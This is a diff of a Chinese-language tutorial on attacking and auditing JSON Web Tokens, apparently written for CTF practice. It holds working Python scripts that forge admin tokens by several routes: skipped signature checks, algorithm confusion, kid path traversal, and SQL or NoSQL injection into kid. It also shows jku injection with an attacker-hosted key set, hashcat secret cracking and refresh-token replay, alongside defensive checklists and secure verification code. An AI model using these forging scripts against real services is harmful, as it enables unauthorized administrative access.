+print('Header:', jwt.get_unverified_header(token))
+print('Payload:', jwt.decode(token, options={'verify_signature': False}))
+"
+
+# Hashcat JWT 爆破
+hashcat -m 16500 jwt.txt wordlist.txt --force
+```
+
+---
+
+## 七、JWT 完整实战场景演练
+
+### 7.1 场景一：跳过签名验证
+
+**题目**：拿到一个 JWT `eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxx`，目标是成为 admin。
+
+```python
+import base64, json
+
+token = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIifQ.xxx"
+h_b64, p_b64, s_b64 = token.split(".")
+
+def b64u_encode(d):
+    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+# 解码并修改
+payload = json.loads(base64.urlsafe_b64decode(p_b64 + "=="))
+payload["role"] = "admin"
+payload["username"] = "admin"
+
+new_p = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
+new_token = f"{h_b64}.{new_p}.{s_b64}"
+print(new_token)
+```
+
+**如果成功**：服务端未验证签名。
+
+### 7.2 场景二：算法混淆攻击
+
+**题目**：公钥可从 `/.well-known/jwks.json` 获取。
+
+```bash
+# 获取公钥并保存
+curl -s http://target/.well-known/jwks.json | python3 -c "
+import sys, json
+data = json.load(sys.stdin)
+print(json.dumps(data, indent=2))
+" > jwks.json
+```
+
+```python
+import base64, hashlib, hmac, json
+
+# 提取公钥（实际场景中需要解析 JWK 为 PEM 格式）
+with open("public.pem", "rb") as f:
+    public_key = f.read()
+
+header = {"alg": "HS256", "typ": "JWT"}
+payload = {"username": "admin", "role": "admin", "is_admin": True}
+
+def b64u_encode(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
+p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
+signing = f"{h_b64}.{p_b64}".encode()
+signature = hmac.new(public_key, signing, hashlib.sha256).digest()
+sig_b64 = b64u_encode(signature)
+
+print(f"{h_b64}.{p_b64}.{sig_b64}")
+```
+
+### 7.3 场景三：kid 路径穿越
+
+**题目**：服务端从 `/app/keys/{kid}` 读取密钥。
+
+```python
+import base64, hashlib, hmac, json
+
+header = {"alg": "HS256", "typ": "JWT", "kid": "../../../../dev/null"}
+payload = {"username": "admin", "role": "admin"}
+
+def b64u_encode(d):
+    return base64.urlsafe_b64encode(d).rstrip(b"=").decode()
+
+h_b64 = b64u_encode(json.dumps(header, separators=(",", ":")).encode())
+p_b64 = b64u_encode(json.dumps(payload, separators=(",", ":")).encode())
+signing = f"{h_b64}.{p_b64}".encode()
+sig = b64u_encode(hmac.new(b"", signing, hashlib.sha256).digest())
+
+print(f"{h_b64}.{p_b64}.{sig}")
+```
+
+### 7.4 场景四：jku 注入
+
+**题目**：服务端信任 `jku` 并获取 JWKS。
+
+**VPS 上的 jwks.json**：
+```json
+{
+  "keys": [{
+    "kty": "RSA",
+    "kid": "attack-key",
+    "use": "sig",
+    "alg": "RS256",
+    "n": "0vx7agoebGcQSuu...（Base64URL 编码的模数）",
+    "e": "AQAB"
+  }]
+}
+```
+
+**伪造 JWT**：
+```python
+import jwt
+
+private_key = open("private.pem").read()
+payload = {"username": "admin", "role": "admin"}
+headers = {"kid": "attack-key", "jku": "http://你的VPS/jwks.json"}
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
+print(token)
+```
+
+### 7.5 场景五：HS256 弱密钥爆破
+
+**题目**：JWT 使用 HS256，密钥在常见的密码字典中。
+
+```bash
+# 保存 JWT 到 token.txt
+echo "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.xxxxx" > token.txt
+
+# 用 Hashcat 爆破
+hashcat -m 16500 token.txt rockyou.txt
+
+# 查看结果
+hashcat -m 16500 token.txt --show
+```
+
+**破解后生成管理员令牌**：
+```python
+import jwt, time
+secret = "破解出的密钥"
+payload = {
+    "username": "admin",
+    "role": "admin",
+    "exp": int(time.time()) + 3600,
+}
+print(jwt.encode(payload, secret, algorithm="HS256"))
+```
+
+### 7.6 场景六：Claim 校验不完整
+
+**题目**：JWT 签名验证通过，但不检查 `exp`。
+
+```python
+import jwt
+# 即使 JWT 中的 exp 是 1970 年，只要删除 exp 字段
+# 或者设置一个未来的时间戳
+payload = {"username": "admin", "role": "admin", "exp": 4102444800}
+# 需有合法签名
+```
+
+---
+
+## 八、JWT 安全 Header 字段详解
+
+| Header 字段 | 用途 | 是否可信 | 安全风险 |
+|:----------:|:----:|:--------:|:--------:|
+| `alg` | 签名算法 |  攻击者可改 | none 绕过、算法混淆 |
+| `typ` | 令牌类型 |  | 类型混淆 |
+| `kid` | 密钥标识 |  攻击者可改 | 路径穿越、SQL 注入 |
+| `jku` | JWKS URL |  攻击者可改 | SSRF、密钥注入 |
+| `jwk` | 内嵌公钥 |  攻击者可改 | 公钥欺骗 |
+| `x5u` | 证书 URL |  攻击者可改 | SSRF、证书欺骗 |
+| `x5c` | 内嵌证书 |  攻击者可改 | 证书欺骗 |
+| `crit` | 必须检查的头 |  攻击者可改 | 未预期行为 |
+
+## 九、多语言 JWT 生成与验证速查
+
+### Python (PyJWT)
+
+```python
+# 生成
+import jwt, time
+token = jwt.encode(
+    {"sub": "123", "exp": int(time.time()) + 3600},
+    "secret",
+    algorithm="HS256"
+)
+
+# 验证
+try:
+    payload = jwt.decode(token, "secret", algorithms=["HS256"])
+    print(payload)
+except jwt.ExpiredSignatureError:
+    print("expired")
+except jwt.InvalidTokenError:
+    print("invalid")
+```
+
+### PHP (firebase/php-jwt)
+
+```php
+<?php
+require 'vendor/autoload.php';
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+
+$payload = [
+    "sub" => "123",
+    "exp" => time() + 3600,
+];
+
+$jwt = JWT::encode($payload, 'secret', 'HS256');
+
+// 验证
+$decoded = JWT::decode($jwt, new Key('secret', 'HS256'));
+print_r($decoded);
+?>
+```
+
+### Node.js (jsonwebtoken)
+
+```javascript
+const jwt = require('jsonwebtoken');
+
+// 生成
+const token = jwt.sign(
+    { sub: '123', exp: Math.floor(Date.now() / 1000) + 3600 },
+    'secret',
+    { algorithm: 'HS256' }
+);
+
+// 验证
+try {
+    const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256'] });
+    console.log(decoded);
+} catch (err) {
+    console.log('invalid');
+}
+```
+
+### Go (golang-jwt)
+
+```go
+import "github.com/golang-jwt/jwt/v5"
+
+// 生成
+claims := jwt.MapClaims{
+    "sub": "123",
+    "exp": time.Now().Add(time.Hour).Unix(),
+}
+token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+signed, _ := token.SignedString([]byte("secret"))
+
+// 验证
+parsed, err := jwt.Parse(signed, func(t *jwt.Token) (interface{}, error) {
+    return []byte("secret"), nil
+})
+if claims, ok := parsed.Claims.(jwt.MapClaims); ok && parsed.Valid {
+    fmt.Println(claims)
+}
+```
+
+### Java (jjwt)
+
+```java
+import io.jsonwebtoken.Jwts;
+import io.jsonwebtoken.SignatureAlgorithm;
+import javax.crypto.spec.SecretKeySpec;
+import java.util.Date;
+import java.util.Base64;
+
+// 生成
+String secret = "my-secret-key";
+byte[] keyBytes = secret.getBytes();
+SecretKeySpec key = new SecretKeySpec(keyBytes, SignatureAlgorithm.HS256.getJcaName());
+
+String token = Jwts.builder()
+    .claim("sub", "123")
+    .setExpiration(new Date(System.currentTimeMillis() + 3600000))
+    .signWith(key)
+    .compact();
+
+// 验证
+Claims claims = Jwts.parserBuilder()
+    .setSigningKey(key)
+    .build()
+    .parseClaimsJws(token)
+    .getBody();
+```
+
+---
+
+## 十、JWT 安全审计清单
+
+### 10.1 签名验证
+
+- [ ] 是否验证了 Signature？
+- [ ] 是否使用了 `verify_signature=False`？
+- [ ] 验证失败时是否返回 401？
+
+### 10.2 算法配置
+
+- [ ] 是否固定了算法白名单？
+- [ ] 是否拒绝 `alg=none`？
+- [ ] 对称和非对称算法是否分离？
+- [ ] 是否从 Header 读取 `alg` 决定验证方式？
+
+### 10.3 密钥管理
+
+- [ ] HS 系列密钥是否足够强？（≥256 bit）
+- [ ] 密钥是否硬编码在源码中？
+- [ ] `.env` 文件是否泄露？
+
+### 10.4 Header 注入
+
+- [ ] `kid` 是否限制为白名单？
+- [ ] `jku` 是否验证域名白名单？
+- [ ] `jwk` 是否直接信任内嵌公钥？
+- [ ] `x5u` 是否验证证书来源？
+
+### 10.5 Claim 校验
+
+- [ ] 是否验证 `exp`？
+- [ ] 是否验证 `nbf`？
+- [ ] 是否验证 `iss` 和 `aud`？
+- [ ] 是否在 `exp` 缺失时拒绝？
+
+### 10.6 令牌管理
+
+- [ ] 是否有令牌吊销机制？
+- [ ] `jti` 是否使用和验证？
+- [ ] Access/Refresh/ID Token 是否使用不同密钥？
+
+---
+
+## 十一、快速故障排查
+
+### 修改 Payload 后无效
+
+| 可能原因 | 排查方法 |
+|:--------:|:--------:|
+| 改错了令牌位置 | 检查 HTTP Header vs Cookie |
+| 检查 `exp` 已过期 | 延长 `exp` 或删除 |
+| 签名验证确实存在 | 换其他攻击方法 |
+| JWT 格式错误 | 检查 Base64URL 填充和空格 |
+
+### 算法混淆失败
+
+| 可能原因 | 排查方法 |
+|:--------:|:--------:|
+| 公钥不在白名单路径 | 尝试 `/public.pem` `/jwks.json` |
+| 公钥内容不完整 | 确认包含 `-----BEGIN PUBLIC KEY-----` |
+| 服务端库已防御 | 检查是否固定了算法白名单 |
+
+### jku 注入失败
+
+| 可能原因 | 排查方法 |
+|:--------:|:--------:|
+| 服务器不能出网 | 换 kid 注入或其他方法 |
+| 未设置 CORS | jku 获取 JWKS 不需要 CORS |
+| `kid` 不匹配 | 确保 JWKS 中的 kid 和 Header 中的 kid 一致 |
+
+---
+
+ **新手避坑**：JWT 的 typ Claim 也可以被篡改。有些库根据 `typ` 字决定如何处理令牌。将 `typ` 从 `JWT` 改为 `JOSE` 或丢弃 `typ` 字段可能导致不同的处理路径。
+
+## 十二、JWT 扩展攻击技术
+
+### 12.1 kid 注入完整攻击链
+
+**场景一：路径穿越获取空密钥**
+
+```json
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
+```
+
+```python
+import hmac, hashlib, base64, json
+
+# 使用空密钥签名
+header = {"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
+payload = {"username":"admin","role":"admin","is_admin":True}
+
+def b64u(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+h = b64u(json.dumps(header,separators=(",",":")).encode())
+p = b64u(json.dumps(payload,separators=(",",":")).encode())
+s = b64u(hmac.new(b"", f"{h}.{p}".encode(), hashlib.sha256).digest())
+print(f"{h}.{p}.{s}")
+```
+
+**场景二：SQL 注入获取自定义密钥**
+
+当后端代码类似：
+
+```python
+kid = header.get("kid")
+cursor.execute(f"SELECT secret FROM jwt_keys WHERE kid = '{kid}'")
+row = cursor.fetchone()
+```
+
+SQLite 注入：
+
+```json
+{"kid":"' UNION SELECT 'my_custom_secret' --"}
+```
+
+MySQL 注入：
+
+```json
+{"kid":"' UNION SELECT 'my_custom_secret' -- "}
+```
+
+PostgreSQL 注入：
+
+```json
+{"kid":"' UNION SELECT 'my_custom_secret'::text --"}
+```
+
+**场景三：NoSQL 注入（MongoDB）**
+
+当 kid 参数在服务端被解析为 JSON 对象时：
+
+```json
+// 原始请求
+{"kid": {"$gt": ""}}    // MongoDB 中匹配所有非空 kid
+
+// 返回第一个密钥 → 用于伪造 JWT
+```
+
+```json
+{"kid": {"$ne": "nonexistent"}}  // 匹配任意存在的 kid
+```
+
+### 12.2 jku/jwk 完整利用链（含 Docker 部署）
+
+**步骤 1: 生成 RSA 密钥对**
+
+```bash
+openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out private.pem
+openssl pkey -in private.pem -pubout -out public.pem
+```
+
+**步骤 2: 生成 JWKS JSON 文件**
+
+```python
+import json, jwt
+from jwt.algorithms import RSAAlgorithm
+
+with open("private.pem", "rb") as f:
+    private_key = f.read()
+with open("public.pem", "rb") as f:
+    public_key = f.read()
+
+# 生成 JWK
+jwk = json.loads(RSAAlgorithm.to_jwk(public_key))
+jwk["kid"] = "attacker-key-001"
+jwk["use"] = "sig"
+jwk["alg"] = "RS256"
+
+jwks = {"keys": [jwk]}
+with open("jwks.json", "w") as f:
+    json.dump(jwks, f, indent=2)
+```
+
+**步骤 3: 启动 HTTP 服务托管 JWKS**
+
+```bash
+# Python 简单 HTTP 服务器
+python3 -m http.server 9999 &
+# 或使用 Flask/nginx
+```
+
+**步骤 4: 生成伪造 JWT**
+
+```python
+import jwt
+
+payload = {
+    "username": "admin",
+    "role": "admin",
+    "is_admin": True,
+    "iat": 1760000000,
+    "exp": 4102444800  # 2099年过期
+}
+
+headers = {
+    "kid": "attacker-key-001",
+    "jku": "http://YOUR_VPS_IP:9999/jwks.json"
+}
+
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
+print(f"[+] 伪造 JWT:\n{token}")
+```
+
+**步骤 5: 利用 jwk 嵌入公钥（无需 HTTP 服务器）**
+
+```python
+headers = {
+    "kid": "attacker-key-001",
+    "jwk": jwk  # 直接嵌入公钥
+}
+token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
+print(f"[+] 嵌入 JWK JWT:\n{token}")
+```
+
+### 12.3 令牌类型混淆完整攻击
+
+**场景：Refresh Token 被当作 Access Token**
+
+系统通常使用两种令牌：
+
+```
+Access Token:  有效期短（15分钟），用于访问 API
+Refresh Token: 有效期长（7天），用于获取新的 Access Token
+```
+
+如果服务端验证 Access Token 和 Refresh Token 的逻辑相同，攻击者可：
+
+```python
+import base64, json, requests
+
+# 假设获得了一个 Refresh Token
+refresh_token = "eyJhbGciOiJIUzI1NiJ9.eyJ0eXBlIjoicmVmcmVzaCIsInVzZXJuYW1lIjoiZ3Vlc3QifQ.xxx"
+
+# 直接发送到需要 Access Token 的接口
+api_response = requests.get(
+    "http://target/api/admin/flag",
+    headers={"Authorization": f"Bearer {refresh_token}"}
+)
+print(api_response.text)
+```
+
+**防御方式【完整示例】：**
+
+```python
+# 安全的验证逻辑
+def verify_access_token(token: str) -> dict:
+    payload = jwt.decode(
+        token,
+        key,
+        algorithms=["HS256"],
+        options={"require": ["exp", "type"]}
+    )
+    if payload.get("type") != "access":
+        raise jwt.InvalidTokenError("Not an access token")
+    return payload
+
+def verify_refresh_token(token: str) -> dict:
+    payload = jwt.decode(
+        token,
+        REFRESH_KEY,  # 使用不同的密钥
+        algorithms=["HS256"],
+        options={"require": ["exp", "type"]}
+    )
+    if payload.get("type") != "refresh":
+        raise jwt.InvalidTokenError("Not a refresh token")
+    return payload
+```
+
+**类型混淆攻击的三种变体：**
+
+| 变体 | 攻击方式 | 防御方法 |
+|:----|:---------|:---------|
+| Access/Refresh 混淆 | Refresh Token 发到 API 接口 | 不同的 `typ`/不同的密钥 |
+| ID Token 冒充 | ID Token 作为 Access Token | 不同的 `aud`/验证 `typ` |
+| 跨服务混淆 | A 服务的 Token 用于 B 服务 | 不同的 `iss`/不同的密钥 |
+
+### 12.4 Refresh Token 轮换攻击
+
+OAuth 2.0 中 Refresh Token 轮换（Rotation）机制可能被以下方式绕过：
+
+```
+正常流程：
+  使用 Refresh Token → 获得新 Access Token + 新 Refresh Token
+  旧 Refresh Token 失效
+
+攻击流程：
+  窃取 Refresh Token → 重复使用（如果未正确轮换）
+  窃取 Refresh Token → 在轮换窗口内使用两次（如果未检测重复使用）
+```
+
+```python
+import requests
+
+def refresh_token_attack(base_url, stolen_refresh_token):
+    """测试 Refresh Token 是否可以重复使用"""
+
+    # 第一次使用
+    r1 = requests.post(f"{base_url}/token/refresh", json={
+        "refresh_token": stolen_refresh_token
+    })
+    print(f"[*] 第一次使用: {r1.status_code}")
+
+    # 第二次使用（如果第一关通过，说明未轮换）
+    r2 = requests.post(f"{base_url}/token/refresh", json={
+        "refresh_token": stolen_refresh_token
+    })
+    print(f"[*] 第二次使用: {r2.status_code}")
+
+    if r2.status_code == 200:
+        print("[!] Refresh Token 未轮换！可重复使用")
+    else:
+        print("[*] Refresh Token 已正确轮换")
+```
+
+### 12.5 各语言 JWT 签名验证代码示例
+
+**PHP (firebase/php-jwt)：**
+
+```php
+<?php
+require_once 'vendor/autoload.php';
+use Firebase\JWT\JWT;
+use Firebase\JWT\Key;
+
+// 签名
+$payload = ["username" => "admin", "role" => "admin"];
+$jwt = JWT::encode($payload, 'secret-key', 'HS256');
+
+// 解码验证
+$decoded = JWT::decode($jwt, new Key('secret-key', 'HS256'));
+print_r((array)$decoded);
+?>
+```
+
+**Node.js (jsonwebtoken)：**
+
+```javascript
+const jwt = require('jsonwebtoken');
+
+// 签名
+const payload = { username: 'admin', role: 'admin' };
+const token = jwt.sign(payload, 'secret-key', { algorithm: 'HS256', expiresIn: '1h' });
+
+// 验证
+const decoded = jwt.verify(token, 'secret-key', { algorithms: ['HS256'] });
+console.log(decoded);
+```
+
+**Go (golang-jwt)：**
+
+```go
+package main
+import (
+    "fmt"
+    "github.com/golang-jwt/jwt/v5"
+)
+
+func main() {
+    // 签名
+    claims := jwt.MapClaims{"username": "admin", "role": "admin"}
+    token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
+    tokenString, _ := token.SignedString([]byte("secret-key"))
+    fmt.Println(tokenString)
+
+    // 验证
+    parsed, _ := jwt.Parse(tokenString, func(t *jwt.Token) (interface{}, error) {
+        return []byte("secret-key"), nil
+    })
+    fmt.Println(parsed.Claims)
+}
+```
+
+**Java (jjwt 0.12+)：**
+
+```java
+import io.jsonwebtoken.Jwts;
+import io.jsonwebtoken.security.Keys;
+import javax.crypto.SecretKey;
+
+// 签名
+SecretKey key = Keys.hmacShaKeyFor("secret-key-here-32-chars!!".getBytes());
+String token = Jwts.builder()
+    .claim("username", "admin")
+    .claim("role", "admin")
+    .signWith(key)
+    .compact();
+
+// 验证
+var claims = Jwts.parser()
+    .verifyWith(key)
+    .build()
+    .parseClaimsJws(token)
+    .getBody();
+```
+
+### 12.6 JWT 各攻击方法成功率与工具
+
+| 攻击方法 | 成功率 | 所需工具 | 难度 | CTF 出现率 |
+|:--------|:------:|:---------|:----:|:---------:|
+| 跳过签名验证 | 高 | Python/curl | 低 |  |
+| alg=none | 中 | Python | 低 |  |
+| HS 弱密钥爆破 | 高 | Hashcat/john | 中 |  |
+| 算法混淆 RS→HS | 中 | Python + public.pem | 中 |  |
+| kid 路径穿越 | 中 | Python | 中 |  |
+| kid SQL 注入 | 中 | curl + SQL 注入 | 高 |  |
+| jku 注入 | 低 | OpenSSL + HTTP 服务器 | 高 |  |
+| jwk 嵌入公钥 | 中 | Python + RSAAlgorithm | 中 |  |
+| x5u 证书注入 | 低 | OpenSSL + HTTP 服务器 | 高 |  |
+| Claim 绕过 | 高 | Python 修改 | 低 |  |
+| 类型混淆 | 中 | Python | 中 |  |
+
+### 12.7 JWT 安全防御对照扩展
+
+| 防御措施 | 解决的问题 | 实施难度 | 绕过难度 |
+|:---------|:-----------|:--------:|:--------:|
+| 固定算法白名单 | alg=none、算法混淆 | 低 | 高 |
+| 验证签名 | 直接修改 Payload | 低 | 高 |
+| 强密钥 (≥256 bit) | HS 弱密钥爆破 | 低 | 高 |
+| 白名单 kid | 路径穿越、SQL 注入 | 低 | 高 |
+| 禁用 jku/jwk/x5u | Header 注入 | 低 | 高 |
+| 验证 exp/nbf/iss/aud | Claim 绕过 | 低 | 高 |
+| 后端记录 jti | 重放攻击 | 中 | 高 |
+| 不同密钥分令牌类型 | 类型混淆 | 中 | 高 |
+| 短有效期 exp | 缩小重放窗口 | 低 | 中 |
+| HttpOnly + Secure Cookie | XSS 窃取 | 低 | 高 |
+| Token Binding | 令牌劫持 | 高 | 很高 |
+| Certificate Bound Token | 令牌绑定 | 高 | 很高 |
+
+### 12.8 JWT 手动解码与签名验证速查
+
+```python
+# 手动验证 HS256 签名
+import base64, hmac, hashlib, json
+
+token = "eyJh...完整JWT"
+h_b64, p_b64, s_b64 = token.split(".")
+signing_input = f"{h_b64}.{p_b64}".encode()
+
+# 补全 Base64URL 填充
+def b64u_decode(s):
+    s += "=" * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s)
+
+# 使用已知密钥验证
+secret = b"known-secret"
+expected_sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
+actual_sig = b64u_decode(s_b64)
+
+if hmac.compare_digest(expected_sig, actual_sig):
+    print("[+] 签名有效")
+else:
+    print("[-] 签名无效")
+```
+
+### 12.9 JWK 与 JWKS 格式详解
+
+**JWK (JSON Web Key) 单个密钥格式：**
+
+```json
+{
+  "kty": "RSA",
+  "kid": "key-id-001",
+  "use": "sig",
   "alg": "RS256",
-  "typ": "JWT",
-  "kid": "ctf-key",
-  "x5u": "https://attacker.example/cert.pem"
+  "n": "0vx7agoebGcQSuu...（Base64URL 编码的 RSA 模数 n）",
+  "e": "AQAB",
+  "d": "（私钥指数，不放在公开 JWK 中）"
 }
 ```
 
-如果服务器直接访问这个 URL，并使用返回的证书公钥验证 JWT，可能产生和 `jku` 类似的问题：
+**JWKS (JSON Web Key Set) 密钥集合格式：**
 
-1. 攻击者提供自己的证书和私钥。
-2. 使用私钥签发管理员 JWT。
-3. 让 `x5u` 指向攻击者证书。
-4. 服务器错误地信任证书中的公钥。
-5. 攻击者签名验证通过。
-
-同时，任意 `x5u` 也可能引发 SSRF。
-
-`jku`、`jwk`、`x5u` 的共同核心是：
-
-```txt
-服务器是否信任了攻击者提供的验证密钥或密钥来源
+```json
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "kid": "key-2024-01",
+      "n": "...",
+      "e": "AQAB"
+    },
+    {
+      "kty": "EC",
+      "kid": "key-2024-02",
+      "crv": "P-256",
+      "x": "...",
+      "y": "..."
+    }
+  ]
+}
 ```
+
+| JWK 参数 | 含义 | 必需 |
+|:---------|:-----|:----:|
+| `kty` | 密钥类型（RSA/EC/oct） | 是 |
+| `kid` | 密钥 ID | 建议 |
+| `use` | 用途（sig/enc） | 可选 |
+| `alg` | 算法 | 可选 |
+| `n` | RSA 模数 | RSA 必需 |
+| `e` | RSA 公钥指数 | RSA 必需 |
+| `crv` | EC 曲线 | EC 必需 |
+| `x` | EC x 坐标 | EC 必需 |
+| `y` | EC y 坐标 | EC 必需 |
+
+### 12.10 JWT 攻击思维导图（完整版）
+
+```
+拿到 JWT
+  ├── 1. 检查是否有签名验证
+  │     ├── 改 Payload + 保留签名 → 通过 = 无验证
+  │     └── 不通过 → 进 2
+  │
+  ├── 2. 检查算法
+  │     ├── alg=none → 绕过
+  │     ├── RS256 → 算法混淆 | jku | jwk | x5u
+  │     ├── HS256 → 弱密钥爆破
+  │     └── ES256 → 检查随机数复用
+  │
+  ├── 3. 检查 Header
+  │     ├── kid → 路径穿越 | SQL注入 | NoSQL注入
+  │     ├── jku → 自建 JWKS 服务器（+SSRF）
+  │     ├── jwk → 嵌入攻击者公钥
+  │     └── x5u → 自建证书服务器（+SSRF）
+  │
+  ├── 4. 检查 Claim
+  │     ├── exp → 删除/延长
+  │     ├── nbf → 删除/提前
+  │     ├── iss → 跨系统冒用
+  │     └── aud → 跨 API 冒用
+  │
+  ├── 5. 令牌类型
+  │     ├── Access Token vs Refresh Token
+  │     └── ID Token vs Access Token
+  │
+  └── 6. 重放
+        ├── 直接重用已有令牌
+        └── 窃取后重放
+```
+
+### 12.11 20 个 JWT  新手避坑完整版
+
+| # | 误区 | 正解 |
+|:-:|:-----|:-----|
+| 1 | 解码成功 = 令牌合法 | 解码只是 Base64URL，任何人都能做 |
+| 2 | 先爆破 HS 密钥 | 先测试是否验证签名 |
+| 3 | 改 Payload 后服务端不理 | 可能改错了令牌位置 |
+| 4 | alg=none 一定有效 | 只在库配置错误时有效 |
+| 5 | 公钥泄露 = 密钥泄露 | 非对称中公钥公开没事 |
+| 6 | kid 一定有漏洞 | 正常实现可能是白名单字典 |
+| 7 | jti 自动防重放 | 需要后端记录状态 |
+| 8 | HS256 JWT 能被 RS 私钥爆破 | 模式 16500 只适用于 HS 系列 |
+| 9 | 签名验证通过就安全 | 还要检查其他 Claim |
+| 10 | HTTPS 下 JWT 安全 | 泄露渠道不止截获 |
+| 11 | 所有令牌类型都一样 | Access/Refresh/ID Token 不同 |
+| 12 | jku 只能看不能打 | 还可能造成 SSRF |
+| 13 | 空密钥一定被拒绝 | 有些实现允许空密钥 |
+| 14 | HS256 密钥长度不重要 | 弱密钥可被秒级爆破 |
+| 15 | 签名验证 = 完全安全 | Claim 校验同样重要 |
+| 16 | JWT 字段顺序不影响签名 | JSON 字段顺序影响签名结果 |
+| 17 | kid 只用于查找密钥 | 还可能注入 SQL/路径/命令 |
+| 18 | 所有 JWT 库默认安全 | 许多默认配置存在漏洞 |
+| 19 | Refresh Token 不能用于 API | 类型混淆下可能被误用 |
+| 20 | JWKS 端点一定可信 | 攻击者可伪装端点 |
 
 ---
 
-## 1.12 Claim 校验不完整
+>**一句话总结：** JWT 的安全不在于 Payload 能否被解码（任何人都能解码），而在于签名验证是否严格、密钥是否安全、Header 和 Claim 是否被正确校验。按照"签名验证→算法控制→密钥安全→Header注入→Claim校验→类型混淆→重放"的 7 层模型逐一检查。
 
-即使签名验证正确，服务器仍然需要校验 Payload 中的重要 Claim。
-
-### 1.12.1 `exp` 过期时间
-
-例如：
-
-```json
-{
-  "exp": 1760000000
-}
-```
-
-`exp` 一般是 Unix 时间戳。
-
-查看当前 Unix 时间戳：
-
-```python
-import time
-
-print(int(time.time()))
-```
-
-如果：
-
-```txt
-当前时间 > exp
-```
-
-令牌应该被视为过期。
-
-常见错误：
-
-1. 服务器完全不检查 `exp`。
-2. 服务器只在 `exp` 存在时检查，但不要求必须存在。
-3. 删除 `exp` 后令牌反而永久有效。
-4. 把毫秒和秒混用。
-5. 使用字符串时间，导致比较异常。
-6. 允许过大的时间偏移。
-
-测试时可以尝试：
-
-```json
-{
-  "exp": 4102444800
-}
-```
-
-但是修改 `exp` 后仍然需要合法签名，除非服务器没有验证签名或者已经能够伪造令牌。
-
-### 1.12.2 `nbf`
-
-`nbf` 表示在指定时间之前不能使用。
-
-```json
-{
-  "nbf": 1760000000
-}
-```
-
-如果服务器不验证 `nbf`，可能提前使用本应尚未生效的令牌。
-
-### 1.12.3 `iss`
-
-`iss` 表示令牌签发者。
-
-```json
-{
-  "iss": "https://auth.target"
-}
-```
-
-服务器如果只验证签名，不验证签发者，可能接受由另一个系统使用相同密钥签发的 JWT。
-
-### 1.12.4 `aud`
-
-`aud` 表示令牌面向的接收者。
-
-```json
-{
-  "aud": "admin-api"
-}
-```
-
-如果服务器不验证 `aud`，原本给普通 API 使用的令牌可能被拿到管理 API 使用。
-
-### 1.12.5 `jti`
-
-`jti` 是 JWT 的唯一编号。
-
-```json
-{
-  "jti": "55efb8b1-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
-}
-```
-
-服务器可以记录已经使用、注销或撤销的 `jti`。
-
-但是仅仅在 JWT 中放入 `jti`，不会自动防止重放。服务器必须在后端保存状态并执行检查。
-
----
-
-## 1.13 JWT 重放攻击
-
-JWT 签名只能证明令牌没有被修改，不能阻止别人复制这个令牌。
-
-如果攻击者得到一个合法管理员 JWT：
-
-```txt
-eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...
-```
-
-只要令牌仍然有效，就可能直接重复发送。
-
-常见泄露来源：
-
-1. XSS 窃取。
-2. 日志泄露。
-3. URL 中携带 JWT。
-4. Git 或备份文件泄露。
-5. 管理员 Bot 请求泄露。
-6. 不安全的 HTTP 传输。
-7. 浏览器 Local Storage 被读取。
-8. 错误信息输出完整请求头。
-
-使用：
-
-```bash
-curl "http://target/admin" \
-  -H "Authorization: Bearer 【管理员 JWT】"
-```
-
-即使不知道密钥，也不需要修改令牌，因为原令牌本身已经具有管理员权限。
-
-`exp` 只能限制令牌可以重放多长时间，不能阻止有效期内的重放。
-
----
-
-## 1.14 Access Token、Refresh Token 和 ID Token 混淆
-
-一个系统可能同时使用：
-
-```txt
-Access Token
-Refresh Token
-ID Token
-```
-
-它们的结构都可能是 JWT，但用途不同。
-
-| 类型 | 常见作用 |
-| ---- | -------- |
-| Access Token | 访问 API |
-| Refresh Token | 换取新的 Access Token |
-| ID Token | 向客户端描述登录用户身份 |
-
-如果服务器只验证签名，不检查 `typ`、`aud`、`iss` 或用途，可能把一种令牌错误地当成另一种使用。
-
-例如把 Refresh Token 直接发送给管理接口：
-
-```http
-Authorization: Bearer 【Refresh Token】
-```
-
-如果管理接口只检查签名，可能错误接受。
-
-不同用途的令牌应该采用能够互相区分的验证规则，例如：
-
-1. 不同的 `typ`。
-2. 不同的 `aud`。
-3. 不同的 `iss`。
-4. 不同的密钥。
-5. 不同的必需 Claim。
-6. 不同的验证入口。
-
----
-
-## 1.15 使用 PyJWT 分析和验证令牌
-
-安装：
-
-```bash
-pip install pyjwt
-```
-
-读取 Header，但不验证签名：
-
-```python
-import jwt
-
-token = "【JWT】"
-
-header = jwt.get_unverified_header(token)
-
-print(header)
-```
-
-读取 Payload，但不验证签名：
-
-```python
-import jwt
-
-token = "【JWT】"
-
-payload = jwt.decode(
-    token,
-    options={
-        "verify_signature": False
-    }
-)
-
-print(payload)
-```
-
-这种写法只能用于本地分析。
-
-不能在服务器身份认证代码中这样写：
-
-```python
-jwt.decode(
-    token,
-    options={
-        "verify_signature": False
-    }
-)
-```
-
-正确验证 HS256：
-
-```python
-import jwt
-
-token = "【JWT】"
-secret = "【服务器密钥】"
-
-payload = jwt.decode(
-    token,
-    secret,
-    algorithms=["HS256"]
-)
-
